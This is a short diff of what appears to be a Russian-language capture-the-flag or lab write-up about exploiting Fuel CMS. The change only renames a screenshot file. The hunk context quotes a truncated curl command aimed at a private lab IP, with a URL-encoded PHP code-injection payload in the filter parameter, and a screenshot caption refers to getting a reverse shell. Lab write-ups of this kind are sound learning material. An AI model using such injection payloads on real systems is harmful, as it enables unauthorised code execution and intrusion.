@@ -118,7 +118,7 @@ curl -s "http://10.112.162.178/fuel/pages/select/?filter=%27%2Bpi%28print%28%24a
 ```
 
 ![curl command](images/curl-try.jpg)
-![get reverse-shell](images/curl-0.jpg)
+![get reverse-shell](images/curl-o.jpg)
 
 Вообще это можно было сделать с помощью эксплоита.. но это было бы не интересно. 
 
